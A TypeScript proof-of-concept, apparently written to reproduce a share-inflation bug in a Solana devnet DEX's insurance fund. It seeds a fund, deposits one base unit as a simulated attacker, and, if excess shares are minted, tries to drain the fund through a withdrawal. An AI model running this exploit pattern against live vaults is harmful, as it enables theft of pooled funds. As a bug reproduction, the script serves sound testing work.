/** Reproduce the insurance share-mint: deposit 70, then 1 base unit from a 2nd LP; print minted shares.
 *  Correct pro-rata math => the 1-unit deposit should mint ~1 share. Anything huge = the bug. */
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction, sendAndConfirmTransaction } from "@solana/web3.js";
import { createMint, createAccount, mintTo } from "@solana/spl-token";
import * as fs from "fs";
import {
  LEAN_DEVNET, DEX_SIZE, MARKET_SIZE, INS_RECEIPT_SIZE, POS_SCALE,
  initDex, createMarket, depositInsurance, withdrawInsurance, parseInsReceipt, parseMarket,
  type MarketParams, type VaultAccounts,
} from "../src/lean/index.js";
const conn = new Connection(process.env.SOLANA_RPC_URL ?? "https://api.devnet.solana.com", "confirmed");
const P = LEAN_DEVNET.percolator;
const funder = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(`${process.env.HOME}/.config/solana/id.json`, "utf8"))));
async function send(ixs: TransactionInstruction[], s: Keypair[] = []) { for (let i = 0; ; i++) { try { return await sendAndConfirmTransaction(conn, new Transaction().add(...ixs), [funder, ...s], { commitment: "confirmed" }); } catch (e) { if (i < 6 && /429|Too Many|block height|timed out/i.test(String(e))) { await new Promise(r => setTimeout(r, 1500 * (i + 1))); continue; } throw e; } } }
async function newAcc(o: PublicKey, sz: number) { const kp = Keypair.generate(); const lam = await conn.getMinimumBalanceForRentExemption(sz); await send([SystemProgram.createAccount({ fromPubkey: funder.publicKey, newAccountPubkey: kp.publicKey, lamports: lam, space: sz, programId: o })], [kp]); return kp.publicKey; }
const mState = async (m: PublicKey) => parseMarket(Buffer.from((await conn.getAccountInfo(m))!.data));

async function main() {
  const mint = await createMint(conn, funder, funder.publicKey, null, 6);
  const feeVault = await createAccount(conn, funder, mint, funder.publicKey, Keypair.generate());
  const fTok = await createAccount(conn, funder, mint, funder.publicKey, Keypair.generate());
  await mintTo(conn, funder, mint, fTok, funder, 1_000n * POS_SCALE);
  const dex = await newAcc(P, DEX_SIZE);
  await send([initDex(P, { dex, admin: funder.publicKey, mint, feeVault, decimals: 6, createFee: 0n })]);
  const vault = (await import("../src/lean/index.js")).deriveDexVault(P, dex)[0];
  const V: VaultAccounts = { dex, mint, vault };
  const params: MarketParams = { initPrice: 100n * POS_SCALE, exitWindow: 10n, maxStaleness: 9000n, warmupSlots: 0n, imBps: 1000n, mmBps: 500n, liqFeeBps: 100n, tradeFeeBps: 0n, maxMoveBps: 400n, maxInsDrawBps: 2500n, maxOi: 1_000_000n * POS_SCALE, minMm: 0n };
  const mkt = await newAcc(P, MARKET_SIZE);
  await send([createMarket(P, { dex, market: mkt, mint, oracleAuth: Keypair.generate().publicKey, creator: funder.publicKey, creatorToken: fTok, feeVault, params })]);

  // LP1 (me) seeds 70
  const r1 = await newAcc(P, INS_RECEIPT_SIZE);
  await send([depositInsurance(P, V, { market: mkt, receipt: r1, lp: funder.publicKey, sourceToken: fTok, amount: 70n * POS_SCALE })]);
  const rc1 = parseInsReceipt(Buffer.from((await conn.getAccountInfo(r1))!.data));
  let m = await mState(mkt);
  console.log(`after seed 70: receipt1 shares=${rc1.shares}, market insurance=${m.insurance} totalInsShares=${m.totalInsShares}`);

  // LP2 (attacker) deposits 1 base unit (0.000001)
  const r2 = await newAcc(P, INS_RECEIPT_SIZE);
  await send([depositInsurance(P, V, { market: mkt, receipt: r2, lp: funder.publicKey, sourceToken: fTok, amount: 1n })]);
  const rc2 = parseInsReceipt(Buffer.from((await conn.getAccountInfo(r2))!.data));
  m = await mState(mkt);
  console.log(`after deposit 1 unit: receipt2 shares=${rc2.shares}  (correct = 1)   market totalInsShares=${m.totalInsShares} insurance=${m.insurance}`);
  if (rc2.shares > 1000n) {
    console.log(`*** BUG REPRODUCED: 1-unit deposit minted ${rc2.shares} shares (should be 1) ***`);
    // try to drain: withdraw with receipt2
    try { await send([withdrawInsurance(P, V, { market: mkt, receipt: r2, lp: funder.publicKey, destToken: fTok, burnShares: rc2.shares / 2n })]); const after = await mState(mkt); console.log(`after attacker withdraw: market insurance=${after.insurance} (drained=${Number(m.insurance - after.insurance) / 1e6} USDC-equiv)`); } catch (e) { console.log("withdraw:", String(e).slice(0, 120)); }
  } else console.log("no inflation on this simple path — attacker used a multi-step sequence");
  process.exit(0);
}
main().catch(e => { console.error(String(e).slice(0, 400)); process.exit(1); });
